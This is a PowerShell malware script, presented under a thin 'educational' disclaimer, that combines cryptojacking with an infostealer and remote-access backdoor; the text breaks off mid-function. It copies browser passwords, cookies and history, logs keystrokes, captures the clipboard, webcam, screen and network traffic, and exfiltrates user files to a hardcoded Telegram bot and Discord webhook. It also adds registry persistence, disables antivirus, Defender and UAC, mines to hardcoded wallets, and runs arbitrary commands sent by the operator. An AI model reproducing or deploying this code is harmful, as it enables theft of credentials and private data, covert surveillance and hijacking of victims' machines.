# Enhanced Mining Script with Unethical Features (No DLLs, JSON-based)
# WARNING: For educational purposes in a controlled environment ONLY.
# Use outside a controlled environment is ILLEGAL and UNETHICAL.

#Requires -RunAsAdministrator

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()

# Define Windows API for keylogging
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KeyState {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

# Define base directory and files
$baseDir = "$env:APPDATA\AdvancedMiner"
$miningScriptPath = "$baseDir\mining.ps1"
$logFile = "$baseDir\mining_log.txt"
$configFile = "$baseDir\config.json"
$credentialsFile = "$baseDir\credentials.json"
$historyFile = "$baseDir\history.json"
$cookiesFile = "$baseDir\cookies.json"
$scriptUrl = "https://raw.githubusercontent.com/Azulprojets/shubabes/main/mining.ps1"

# URLs for downloading files
$miningScriptUrl = "https://raw.githubusercontent.com/Azulprojets/shubabes/main/mining.ps1"
$sqlite3Url = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip"

# Add a flag for CPU mining
$cpuMiningEnabled = $true  # Set to $false if only GPU mining is desired

# Logging function
function Write-Log {
    param ([string]$message)
    $timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    "$timestamp - $message" | Out-File -FilePath $logFile -Append
    Write-Host "$timestamp - $message"
}

# Function to copy a file using Volume Shadow Copy Service (VSS) when it's locked
function Copy-FileUsingVSS {
    param (
        [string]$sourceFile,
        [string]$destinationFile
    )
    try {
        # Get the volume (e.g., C:\) of the source file
        $volume = [System.IO.Path]::GetPathRoot($sourceFile)

        # Create a shadow copy
        $shadow = (Get-WmiObject -Class Win32_ShadowCopy -List).Create($volume, "ClientAccessible")
        if ($shadow.ReturnValue -ne 0) {
            throw "Failed to create shadow copy. ReturnValue: $($shadow.ReturnValue)"
        }

        # Retrieve the shadow copy object
        $shadowCopy = Get-WmiObject -Class Win32_ShadowCopy | Where-Object { $_.ID -eq $shadow.ShadowID }
        if (-not $shadowCopy) {
            throw "Failed to retrieve shadow copy object."
        }

        # Construct the path to the file in the shadow copy
        $shadowPath = $shadowCopy.DeviceObject
        $relativePath = $sourceFile -replace [regex]::Escape($volume), ""
        $shadowFilePath = "$shadowPath\$relativePath"

        # Copy the file from the shadow copy
        Copy-Item -Path $shadowFilePath -Destination $destinationFile -Force
        Write-Log "Successfully copied $sourceFile to $destinationFile using VSS."

        # Clean up the shadow copy
        $shadowCopy.Delete()
    } catch {
        Write-Log "Failed to copy $sourceFile using VSS: $_"
        throw
    }
}

# Function to attempt direct file copy and fall back to VSS if the file is locked
function Copy-LockedFile {
    param (
        [string]$source,
        [string]$dest
    )
    try {
        # Attempt direct copy
        Copy-Item -Path $source -Destination $dest -Force -ErrorAction Stop
        Write-Log "Copied $source to $dest directly."
    } catch {
        # Check if the error is due to the file being locked
        if ($_.Exception -is [System.IO.IOException] -and $_.Exception.Message -like "*being used by another process*") {
            Write-Log "Direct copy failed: $_ (file locked). Attempting VSS copy..."
            Copy-FileUsingVSS -sourceFile $source -destinationFile $dest
        } else {
            Write-Log "Failed to copy $source: $_"
            throw
        }
    }
}

# Create base directory if it doesn’t exist
if (-not (Test-Path $baseDir)) {
    New-Item -Path $baseDir -ItemType Directory -Force | Out-Null
    Write-Log "Created directory: $baseDir"
}

# Check and download mining.ps1 if not present
if (-not (Test-Path $miningScriptPath)) {
    Write-Log "mining.ps1 not found. Downloading from $miningScriptUrl..."
    try {
        Invoke-WebRequest -Uri $miningScriptUrl -OutFile $miningScriptPath -ErrorAction Stop
        Write-Log "mining.ps1 downloaded successfully to $miningScriptPath."
    } catch {
        Write-Log "Failed to download mining.ps1: $_"
        exit 1
    }
} else {
    Write-Log "mining.ps1 found at $miningScriptPath."
}

# Check and download sqlite3.exe if not present
$sqlite3Path = "$baseDir\sqlite3.exe"
if (-not (Test-Path $sqlite3Path)) {
    Write-Log "sqlite3.exe not found. Downloading from $sqlite3Url..."
    try {
        $zipPath = "$env:TEMP\sqlite3.zip"
        Invoke-WebRequest -Uri $sqlite3Url -OutFile $zipPath -ErrorAction Stop
        Expand-Archive -Path $zipPath -DestinationPath $baseDir -Force -ErrorAction Stop
        $extractedSqlite3 = Get-ChildItem -Path $baseDir -Recurse -Filter "sqlite3.exe" | Select-Object -First 1
        if ($extractedSqlite3) {
            Move-Item -Path $extractedSqlite3.FullName -Destination $sqlite3Path -Force -ErrorAction Stop
            Write-Log "sqlite3.exe moved to $sqlite3Path."
        } else {
            Write-Log "sqlite3.exe not found in the extracted files."
            exit 1
        }
        Remove-Item $zipPath -ErrorAction Stop
    } catch {
        Write-Log "Failed to download or extract sqlite3.exe: $_"
        exit 1
    }
} else {
    Write-Log "sqlite3.exe found at $sqlite3Path."
}

# Load configuration from config.json
if (-not (Test-Path $configFile)) {
    Write-Log "Config file not found. Creating default config.json."
    $defaultConfig = @{
        telegram_token = "7096283583:AAE7iv8FKDJZ5Ok5Bq0NdZ5Qa_a1KoIYfjg"
        telegram_chat_id = "7486857021"
        discord_webhook = "https://discord.com/api/webhooks/1358278272080674994/Wg5AJoXN0TzH8Fo4VpElW4n_zCWE7FH5aYHyBpFc0ygsosMohmR-5gws_VIExd6Vanu9"
        pool_fee = 0.01
        electricity_cost = 0.1
        supported_algorithms = @{
            "Ethash" = "T-Rex"
            "KawPow" = "NBMiner"
            "RandomX" = "XMRig"
            "Autolykos" = "lolMiner"
        }
    }
    $defaultConfig | ConvertTo-Json | Out-File $configFile
}
$config = Get-Content $configFile | ConvertFrom-Json
$telegramBotToken = $config.telegram_token
$telegramChatId = $config.telegram_chat_id
$discordWebhookUrl = $config.discord_webhook
$supportedAlgorithms = $config.supported_algorithms

# Wallet setup (replace with your actual wallets)
$env:GPU_WALLET = "0x6D8E80004900a938b518e1aA01fDdB384a089F1E"  # ETH Wallet
$env:XMR_WALLET = "4B7F3tuKdQVNB7QMoyfvG62EEqHEKV4iQWfZH5RAA5uz3STSWchWQ9dH8Jt9P6woRCP1UYX58HxPZW4BqdZ7v2ETLkYi1D5"  # XMR Wallet
$env:TON_WALLET = "UQDg4WHFrh5CagHuodkhfzrlFtW_nCyCpq_hD763gb6yhOC0"  # TON Wallet

# Initialize script variables
$script:lastHashrate = 0
$script:totalEarnings = 0
$script:overheatCount = 0
$script:lastUpdateId = 0
$script:currentAlgorithm = "Ethash"
$script:lastSwitchTime = Get-Date

# Helper function to convert hex blob to byte array
function Convert-HexBlobToByteArray {
    param ([string]$blob)
    if ($blob -match "^X'([0-9A-Fa-f]+)'$") {
        $hexString = $matches[1]
        $byteArray = @()
        for ($i = 0; $i -lt $hexString.Length; $i += 2) {
            $byte = [Byte]::Parse($hexString.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber)
            $byteArray += $byte
        }
        return $byteArray
    } else {
        return $null
    }
}

# **Telegram/Discord Functions**

function Send-TelegramMessage {
    param ([string]$message)
    $message = $message -replace "[\x00-\x1F]", ""  # Remove control characters
    $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage"
    try {
        if ($message.Length -gt 4096) {
            $chunks = [System.Collections.ArrayList]::new()
            $start = 0
            while ($start -lt $message.Length) {
                $length = [Math]::Min(4096, $message.Length - $start)
                $chunks.Add($message.Substring($start, $length)) | Out-Null
                $start += 4096
            }
            foreach ($chunk in $chunks) {
                Invoke-RestMethod -Uri $url -Method Post -Body @{
                    chat_id = $telegramChatId
                    text    = $chunk
                } -ErrorAction Stop
            }
        } else {
            Invoke-RestMethod -Uri $url -Method Post -Body @{
                chat_id = $telegramChatId
                text    = $message
            } -ErrorAction Stop
        }
    } catch {
        Write-Log "Telegram send failed: $_"
    }
}

function Send-TelegramFile {
    param ([string]$filePath)
    $url = "https://api.telegram.org/bot$telegramBotToken/sendDocument"
    try {
        $boundary = [System.Guid]::NewGuid().ToString()
        $contentType = "multipart/form-data; boundary=$boundary"
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $fileName = [System.IO.Path]::GetFileName($filePath)
        $bodyLines = @(
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            "$telegramChatId",
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"",
            "Content-Type: application/octet-stream",
            "",
            [System.Text.Encoding]::UTF8.GetString($fileBytes),
            "--$boundary--"
        )
        $body = [string]::Join("`r`n", $bodyLines)
        Invoke-RestMethod -Uri $url -Method Post -ContentType $contentType -Body $body -ErrorAction Stop
    } catch {
        Write-Log "Telegram file send failed: $_"
    }
}

function Send-DiscordWebhook {
    param ([string]$message)
    $message = $message -replace "[\x00-\x1F]", ""  # Remove control characters
    $body = @{ content = $message } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop
    } catch {
        Write-Log "Discord send failed: $_"
    }
}

# **Account Grabbing Functions**

function Get-ChromeEncryptionKey {
    $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    if (-not (Test-Path $localStatePath)) {
        Write-Log "Chrome Local State file not found at $localStatePath."
        return $null
    }
    try {
        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
        $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)] # Remove "DPAPI" prefix
        Write-Log "Encryption key retrieved (decryption skipped due to missing ProtectedData)."
        return $encryptedKey
    } catch {
        Write-Log "Failed to retrieve Chrome encryption key: $_"
        return $null
    }
}

function Decrypt-ChromePassword {
    param (
        [byte[]]$encryptedData,
        [byte[]]$key
    )
    Write-Log "Password decryption skipped; returning encrypted data."
    return [Convert]::ToBase64String($encryptedData)
}

function Get-ChromeCredentials {
    $chromeDbPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    $tempDb = "$env:TEMP\ChromeLoginData.db"
    if (-not (Test-Path $chromeDbPath)) {
        Write-Log "Chrome Login Data not found at $chromeDbPath."
        return
    }
    try {
        Copy-LockedFile -source $chromeDbPath -dest $tempDb
        $query = "SELECT origin_url, username_value, password_value FROM logins"
        $output = & "$baseDir\sqlite3.exe" $tempDb $query -separator '|'
        $encryptionKey = Get-ChromeEncryptionKey
        if (-not $encryptionKey) {
            Write-Log "Failed to get encryption key."
            Remove-Item $tempDb -ErrorAction SilentlyContinue
            return
        }
        $credentials = @()
        if (Test-Path $credentialsFile) {
            $credentials = Get-Content $credentialsFile | ConvertFrom-Json
        }
        foreach ($line in $output) {
            $fields = $line -split '\|'
            $url = $fields[0]
            $username = $fields[1]
            $passwordValue = $fields[2]
            if ($passwordValue -match "^X'([0-9A-Fa-f]+)'$") {
                $byteArray = Convert-HexBlobToByteArray -blob $passwordValue
                if ($byteArray) {
                    $password = Decrypt-ChromePassword -encryptedData $byteArray -key $encryptionKey
                    $credential = [PSCustomObject]@{
                        Source = "Chrome"
                        URL = $url
                        Username = $username
                        Password = $password  # Encrypted as base64
                        Timestamp = (Get-Date).ToString()
                    }
                    $credentials += $credential
                    $message = "Chrome - URL: $url, User: $username, Pass (encrypted): $password"
                    Send-TelegramMessage -message $message
                    Send-DiscordWebhook -message $message
                    Write-Log "Extracted credential for $url (password encrypted)"
                } else {
                    Write-Log "Invalid hex blob for password at $url"
                }
            } else {
                Write-Log "Password for $url is not in expected hex blob format: $passwordValue"
            }
        }
        $credentials | ConvertTo-Json | Out-File $credentialsFile
    } catch {
        Write-Log "Failed to process Chrome credentials: $_"
    } finally {
        Remove-Item $tempDb -ErrorAction SilentlyContinue
    }
}

function Get-EdgeCredentials {
    $edgeDbPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    $tempDb = "$env:TEMP\EdgeLoginData.db"
    if (-not (Test-Path $edgeDbPath)) {
        Write-Log "Edge Login Data not found at $edgeDbPath."
        return
    }
    try {
        Copy-LockedFile -source $edgeDbPath -dest $tempDb
        $query = "SELECT origin_url, username_value, password_value FROM logins"
        $output = & "$baseDir\sqlite3.exe" $tempDb $query -separator '|'
        $encryptionKey = Get-ChromeEncryptionKey
        if (-not $encryptionKey) {
            Write-Log "Failed to retrieve Edge encryption key."
            Remove-Item $tempDb -ErrorAction SilentlyContinue
            return
        }
        $credentials = @()
        if (Test-Path $credentialsFile) {
            $credentials = Get-Content $credentialsFile | ConvertFrom-Json
        }
        foreach ($line in $output) {
            $fields = $line -split '\|'
            $url = $fields[0]
            $username = $fields[1]
            $passwordValue = $fields[2]
            if ($passwordValue -match "^X'([0-9A-Fa-f]+)'$") {
                $byteArray = Convert-HexBlobToByteArray -blob $passwordValue
                if ($byteArray) {
                    $password = Decrypt-ChromePassword -encryptedData $byteArray -key $encryptionKey
                    $credential = [PSCustomObject]@{
                        Source = "Edge"
                        URL = $url
                        Username = $username
                        Password = $password  # Encrypted as base64
                        Timestamp = (Get-Date).ToString()
                    }
                    $credentials += $credential
                    $message = "Edge - URL: $url, User: $username, Pass (encrypted): $password"
                    Send-TelegramMessage -message $message
                    Send-DiscordWebhook -message $message
                    Write-Log "Extracted Edge credential for $url (password encrypted)"
                } else {
                    Write-Log "Invalid hex blob for password at $url"
                }
            } else {
                Write-Log "Password for $url is not in expected hex blob format: $passwordValue"
            }
        }
        $credentials | ConvertTo-Json | Out-File $credentialsFile
    } catch {
        Write-Log "Failed to process Edge credentials: $_"
    } finally {
        Remove-Item $tempDb -ErrorAction SilentlyContinue
    }
}

# **Additional Unethical Features**

function Get-ChromeHistory {
    $historyPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
    $tempHistory = "$env:TEMP\ChromeHistory.db"
    if (-not (Test-Path $historyPath)) {
        Write-Log "Chrome History not found at $historyPath."
        return
    }
    try {
        Copy-LockedFile -source $historyPath -dest $tempHistory
        $query = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 50"
        $output = & "$baseDir\sqlite3.exe" $tempHistory $query -separator '|'
        $historyEntries = @()
        if (Test-Path $historyFile) {
            $historyItems = Get-Content $historyFile | ConvertFrom-Json
        } else {
            $historyItems = @()
        }
        foreach ($line in $output) {
            $fields = $line -split '\|'
            $url = $fields[0]
            $title = $fields[1]
            $visitCount = $fields[2]
            $entry = "$url - $title (Visits: $visitCount)"
            $historyEntries += $entry
            $historyItems += [PSCustomObject]@{
                URL = $url
                Title = $title
                VisitCount = $visitCount
                Timestamp = (Get-Date).ToString()
            }
        }
        $historyItems | ConvertTo-Json | Out-File $historyFile
        for ($i = 0; $i -lt $historyEntries.Count; $i += 5) {
            $batch = $historyEntries[$i..($i + 4)] -join "`n"
            $batchMessage = "Chrome History Batch $($i/5 + 1):`n$batch"
            Send-TelegramMessage -message $batchMessage
            Send-DiscordWebhook -message $batchMessage
        }
        Write-Log "Sent Chrome history."
    } catch {
        Write-Log "Failed to process Chrome history: $_"
    } finally {
        Remove-Item $tempHistory -ErrorAction SilentlyContinue
    }
}

function Get-ChromeCookies {
    $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
    $tempCookies = "$env:TEMP\ChromeCookies.db"
    if (-not (Test-Path $cookiesPath)) {
        Write-Log "Chrome Cookies not found at $cookiesPath."
        return
    }
    try {
        Copy-LockedFile -source $cookiesPath -dest $tempCookies
        $query = "SELECT host_key, name, encrypted_value FROM cookies"
        $output = & "$baseDir\sqlite3.exe" $tempCookies $query -separator '|'
        $encryptionKey = Get-ChromeEncryptionKey
        if (-not $encryptionKey) {
            Write-Log "Failed to get encryption key."
            Remove-Item $tempCookies -ErrorAction SilentlyContinue
            return
        }
        $cookieEntries = @()
        if (Test-Path $cookiesFile) {
            $cookies = Get-Content $cookiesFile | ConvertFrom-Json
        } else {
            $cookies = @()
        }
        foreach ($line in $output) {
            $fields = $line -split '\|'
            $host = $fields[0]
            $name = $fields[1]
            $encryptedValue = $fields[2]
            if ($encryptedValue -match "^X'([0-9A-Fa-f]+)'$") {
                $byteArray = Convert-HexBlobToByteArray -blob $encryptedValue
                if ($byteArray) {
                    $value = Decrypt-ChromePassword -encryptedData $byteArray -key $encryptionKey
                    $entry = "Host: $host, Name: $name, Value (encrypted): $value"
                    $cookieEntries += $entry
                    $cookies += [PSCustomObject]@{
                        Host = $host
                        Name = $name
                        Value = $value  # Encrypted as base64
                        Timestamp = (Get-Date).ToString()
                    }
                } else {
                    Write-Log "Invalid hex blob for cookie value: $encryptedValue"
                }
            } else {
                Write-Log "Cookie value not in expected hex blob format: $encryptedValue"
            }
        }
        $cookies | ConvertTo-Json | Out-File $cookiesFile
        for ($i = 0; $i -lt $cookieEntries.Count; $i += 5) {
            $batch = $cookieEntries[$i..($i + 4)] -join "`n"
            $batchMessage = "Chrome Cookies Batch $($i/5 + 1):`n$batch"
            Send-TelegramMessage -message $batchMessage
            Send-DiscordWebhook -message $batchMessage
        }
        Write-Log "Sent Chrome cookies."
    } catch {
        Write-Log "Failed to process Chrome cookies: $_"
    } finally {
        Remove-Item $tempCookies -ErrorAction SilentlyContinue
    }
}

function Capture-NetworkTraffic {
    Write-Log "Starting network traffic capture..."
    $captureFile = "$env:TEMP\network_capture.etl"
    try {
        netsh trace start capture=yes tracefile=$captureFile maxsize=10
        Start-Sleep -Seconds 60
        netsh trace stop
        Send-TelegramFile -filePath $captureFile
        Send-DiscordWebhook -message "Network traffic captured."
        Remove-Item $captureFile
        Write-Log "Network traffic captured and sent."
    } catch {
        Write-Log "Failed to capture network traffic: $_"
    }
}

function Start-Keylogging {
    Write-Log "Starting keylogging..."
    $logFile = "$env:TEMP\keystrokes.txt"
    $endTime = (Get-Date).AddMinutes(1)
    while ((Get-Date) -lt $endTime) {
        Start-Sleep -Milliseconds 10
        $keys = ""
        for ($i = 0; $i -lt 255; $i++) {
            if ([KeyState]::GetAsyncKeyState($i) -band 0x8000) {
                $keys += [char]$i
            }
        }
        if ($keys) {
            $keys | Out-File -FilePath $logFile -Append
            Send-TelegramMessage -message "Keystrokes: $keys"
            Send-DiscordWebhook -message "Keystrokes: $keys"
            Write-Log "Captured keystrokes: $keys"
        }
    }
    Write-Log "Keylogging stopped after 1 minute for demonstration."
}

function Start-ScreenRecording {
    Write-Log "Starting screen recording..."
    $outputFile = "$env:TEMP\screen_record.mp4"
    $ffmpegPath = "C:\ffmpeg\bin\ffmpeg.exe"
    if (Test-Path $ffmpegPath) {
        & $ffmpegPath -f gdigrab -framerate 30 -i desktop -t 10 $outputFile -y
        Send-TelegramFile -filePath $outputFile
        Send-DiscordWebhook -message "Screen recording captured."
        Write-Log "Screen recording saved to $outputFile and sent."
    } else {
        Write-Log "FFmpeg not found for screen recording."
    }
}

function Capture-Webcam {
    Write-Log "Capturing webcam image..."
    $outputImage = "$env:TEMP\webcam.jpg"
    try {
        $webcam = New-Object -ComObject "WIA.CommonDialog"
        $image = $webcam.ShowAcquireImage()
        $image.SaveFile($outputImage)
        Send-TelegramFile -filePath $outputImage
        Send-DiscordWebhook -message "Webcam snapshot captured."
        Write-Log "Webcam image saved to $outputImage and sent."
    } catch {
        Write-Log "Webcam capture failed: $_"
    }
}

function Exfiltrate-Files {
    Write-Log "Starting file exfiltration..."
    $targetFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.docx, *.txt, *.pdf, *wallet* -ErrorAction SilentlyContinue
    $fileCount = $targetFiles.Count
    Write-Log "Found $fileCount files to exfiltrate."
    foreach ($file in $targetFiles) {
        Send-TelegramFile -filePath $file.FullName
        Send-DiscordWebhook -message "Exfiltrated file: $($file.Name)"
        Write-Log "Exfiltrated file: $($file.FullName)"
    }
    Write-Log "File exfiltration completed."
}

function Start-ClipboardHijacking {
    Write-Log "Starting clipboard hijacking..."
    $endTime = (Get-Date).AddMinutes(1)
    while ((Get-Date) -lt $endTime) {
        $clip = Get-Clipboard
        if ($clip) {
            Send-TelegramMessage -message "Clipboard content: $clip"
            Send-DiscordWebhook -message "Clipboard content: $clip"
            Write-Log "Captured clipboard: $clip"
            Set-Clipboard -Value "Clipboard hijacked for testing."
        }
        Start-Sleep -Seconds 5
    }
    Write-Log "Clipboard hijacking stopped after 1 minute for demonstration."
}

# **Mining Functions**

function Get-MostProfitableCoin {
    try {
        $profitData = Invoke-RestMethod -Uri "https://whattomine.com/coins.json" -TimeoutSec 10
        $coins = $profitData.coins | Where-Object { $_.algorithm -in $supportedAlgorithms.Keys }
        if (-not $coins) {
            Write-Log "No profitable coins found for supported algorithms."
            return $null
        }
        $bestCoin = $coins | ForEach-Object {
            $_ | Add-Member -NotePropertyName "net_profit" -NotePropertyValue ($_.profitability * (1 - $config.pool_fee)) -PassThru
        } | Sort-Object -Property net_profit -Descending | Select-Object -First 1
        Write-Log "Most profitable coin: $($bestCoin.tag) with algorithm $($bestCoin.algorithm)"
        return $bestCoin
    } catch {
        Write-Log "Failed to fetch profitability data: $_"
        return $null
    }
}

function Get-BestPool {
    param ([string]$algorithm)
    $pools = @{
        "Ethash" = @("stratum+tcp://etc.2miners.com:1010", "stratum+tcp://eth.nanopool.org:9999")
        "KawPow" = @("stratum+tcp://rvn.2miners.com:6060", "stratum+tcp://rvn.nanopool.org:12222")
        "RandomX" = @("stratum+tcp://xmr.pool.minergate.com:443", "stratum+tcp://pool.hashvault.pro:5555")
        "Autolykos" = @("stratum+tcp://ergo.2miners.com:8888", "stratum+tcp://ergo.nanopool.org:11111")
    }
    if ($pools.ContainsKey($algorithm)) {
        return $pools[$algorithm] | Get-Random
    }
    return "stratum+tcp://pool.hashvault.pro:5555"
}

function Set-NvidiaOverclock {
    param ([int]$powerLimit = 70, [int]$coreOffset = 100, [int]$memOffset = 500)
    $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
    if (Test-Path $nvidiaSmi) {
        & $nvidiaSmi -pl $powerLimit
        & $nvidiaSmi -lgc $coreOffset
        & $nvidiaSmi -lmc $memOffset
        Write-Log "Applied NVIDIA overclock: Power $powerLimit W, Core +$coreOffset MHz, Mem +$memOffset MHz"
    }
}

function Set-AmdOverclock {
    param ([string]$profile = "Profile1")
    $overdriveToolPath = "$baseDir\OverdriveNTool.exe"
    if (Test-Path $overdriveToolPath) {
        & $overdriveToolPath -p1$profile
        Write-Log "Applied AMD overclock profile: $profile"
    }
}

function Install-Miner {
    param ([string]$miner, [string]$url, [string]$path)
    try {
        if (-not (Test-Path $path)) { New-Item -Path $path -ItemType Directory -Force | Out-Null }
        $exePath = "$path\$miner.exe"
        if (-not (Test-Path $exePath)) {
            Download-Miner -miner $miner -url $url -path $path
        }
        Write-Log "Miner ready at $exePath."
        return "$miner.exe"
    } catch {
        Write-Log "Install-Miner ($miner) failed: $_"
        return $null
    }
}

function Start-Miner {
    param (
        [string]$algorithm,
        [string]$pool,
        [int]$gpuIndex = -1
    )
    $miner = $supportedAlgorithms[$algorithm]
    $exePath = "$baseDir\$miner\$miner.exe"
    if (-not (Test-Path $exePath)) { return $null }
    $args = switch ($algorithm) {
        "Ethash" { "-a ethash -o $pool -u $env:GPU_WALLET.$env:COMPUTERNAME -p x --api-bind-http 127.0.0.1:4067" }
        "KawPow" { "-a kawpow -o $pool -u $env:GPU_WALLET.$env:COMPUTERNAME -p x" }
        "RandomX" { "--donate-level=1 -o $pool -u $env:XMR_WALLET -p $env:COMPUTERNAME --http-enabled --http-port=4068" }
        "Autolykos" { "-a autolykos2 -o $pool -u $env:GPU_WALLET.$env:COMPUTERNAME -p x" }
    }
    if ($gpuIndex -ge 0) { $args += " --devices $gpuIndex" }
    try {
        $process = Start-Process -FilePath $exePath -ArgumentList $args -WindowStyle Hidden -PassThru
        Write-Log "$miner started (PID: $($process.Id)) for $algorithm."
        return $process
    } catch {
        Write-Log "Failed to start $($miner): $_"
    }
}

function Stop-Miner {
    Get-Process -Name "t-rex", "nbminer", "xmrig", "lolminer" -ErrorAction SilentlyContinue | Stop-Process -Force
    Write-Log "All miners stopped."
}

function Monitor-Miner {
    while ($true) {
        if (-not (Get-Process -Name "t-rex", "nbminer", "xmrig", "lolminer" -ErrorAction SilentlyContinue)) {
            Write-Log "Miners not running. Restarting..."
            $bestCoin = Get-MostProfitableCoin
            if ($bestCoin) {
                $pool = Get-BestPool -algorithm $bestCoin.algorithm
                Start-Miner -algorithm $bestCoin.algorithm -pool $pool
            }
        }
        Start-Sleep -Seconds 300
    }
}

function Set-MinerIntensity {
    param ([int]$intensity)
    Write-Log "Intensity adjustment not implemented for all miners."
}

function Switch-Coin {
    param ([string]$coin)
    $algorithm = $supportedAlgorithms.Keys | Where-Object { (Get-MostProfitableCoin).tag -eq $coin }
    if ($algorithm) {
        Stop-Miner
        $pool = Get-BestPool -algorithm $algorithm
        Start-Miner -algorithm $algorithm -pool $pool
        $script:currentAlgorithm = $algorithm
    }
}

# **Utility Functions**

function Ensure-Persistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $scriptPath = "$baseDir\mining.ps1"
    if (-not (Test-Path $regPath)) { 
        New-Item -Path $regPath -Force | Out-Null 
    }
    Set-ItemProperty -Path $regPath -Name "AdvancedMiner" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
    Write-Log "Persistence added via registry."
}

function Disable-AllAntivirus {
    $avServices = @("McAfee", "Norton", "Symantec", "Kaspersky", "Avast", "AVG", "Bitdefender", "TrendMicro", "Sophos")
    foreach ($service in $avServices) {
        $svc = Get-Service -Name "*$service*" -ErrorAction SilentlyContinue
        if ($svc) {
            Stop-Service -Name $svc.Name -Force -ErrorAction SilentlyContinue
            Set-Service -Name $svc.Name -StartupType Disabled -ErrorAction SilentlyContinue
            Write-Log "Disabled antivirus service: $($svc.Name)"
        }
    }
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    Write-Log "Attempted to disable all antivirus software."
}

function Prevent-Sleep {
    $shell = New-Object -ComObject "WScript.Shell"
    Start-Job -Name "SleepPreventer" -ScriptBlock {
        param ($shell)
        while ($true) {
            $shell.SendKeys("{F15}")
            Start-Sleep -Seconds 60
        }
    } -ArgumentList $shell
    Write-Log "Sleep prevention job started."
}

function Bypass-WindowsSecurity {
    Disable-AllAntivirus
    Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
    Set-Service -Name "wuauserv" -StartupType Disabled -ErrorAction SilentlyContinue
    $paths = @("$baseDir\T-Rex", "$baseDir\TeamRedMiner", "$baseDir\XMRig", "$baseDir\lolMiner", $baseDir)
    foreach ($path in $paths) {
        if (-not (Get-MpPreference).ExclusionPath -contains $path) {
            Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
            Write-Log "Exclusion added for path: $path"
        }
    }
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue
    Write-Log "Windows security bypassed."
}

function Download-Miner {
    param ([string]$miner, [string]$url, [string]$path)
    $zipPath = "$env:TEMP\$miner.zip"
    Invoke-WebRequest -Uri $url -OutFile $zipPath -ErrorAction Stop
    Expand-Archive -Path $zipPath -DestinationPath $path -Force -ErrorAction Stop
    Remove-Item $zipPath -ErrorAction Stop
    $exeName = "$miner.exe"
    $exePath = Get-ChildItem -Path $path -Filter $exeName -Recurse | Select-Object -First 1
    if ($exePath) {
        Move-Item -Path $exePath.FullName -Destination "$path\$exeName" -Force
        Get-ChildItem -Path $path -Directory | Remove-Item -Recurse -Force
        Write-Log "$miner downloaded and extracted."
    }
}

function Get-GPUTemperature {
    $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
    if (Test-Path $nvidiaSmi) {
        $temp = [int](& $nvidiaSmi --query-gpu=temperature.gpu --format=csv,noheader | Select-Object -First 1)
        if ($temp -gt 80) { $script:overheatCount++ }
        Write-Log "GPU temp: $temp°C"
        return $temp
    }
    return 50
}

function Test-GPUCompatibility {
    $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
    if (Test-Path $nvidiaSmi) { return "NVIDIA" }
    $amdGpu = Get-WmiObject Win32_VideoController | Where-Object { $_.Name -match "AMD|Radeon" }
    if ($amdGpu) { return "AMD" }
    Write-Log "No compatible GPU."
    return $null
}

function Process-Command {
    param ([string]$command)
    switch -Wildcard ($command) {
        "/start" { 
            $bestCoin = Get-MostProfitableCoin
            if ($bestCoin) {
                $pool = Get-BestPool -algorithm $bestCoin.algorithm
                Start-Miner -algorithm $bestCoin.algorithm -pool $pool
                Send-TelegramMessage -message "Mining started."
            }
        }
        "/stop" { Stop-Miner; Send-TelegramMessage -message "Mining stopped." }
        "/status" { 
            $status = "Hashrate: $script:lastHashrate MH/s, Earnings: $script:totalEarnings USD, Overheats: $script:overheatCount"
            Send-TelegramMessage -message $status
            Send-DiscordWebhook -message $status
        }
        "/restart" { Send-TelegramMessage -message "Restarting system..."; Restart-Computer -Force }
        "/switch_coin *" {
            $coin = $command -replace "/switch_coin ", ""
            Switch-Coin -coin $coin
            Send-TelegramMessage -message "Switched to mining $coin."
        }
        "/set_intensity *" {
            $intensity = $command -replace "/set_intensity ", ""
            Set-MinerIntensity -intensity $intensity
            Send-TelegramMessage -message "Intensity set to $intensity."
        }
        "/get_logs" {
            Send-TelegramFile -filePath $logFile
            Send-DiscordWebhook -message "Log file uploaded."
        }
        "/execute *" {
            $cmd = $command -replace "/execute ", ""
            $output = Invoke-Expression $cmd 2>&1
            Send-TelegramMessage -message "Output: $output"
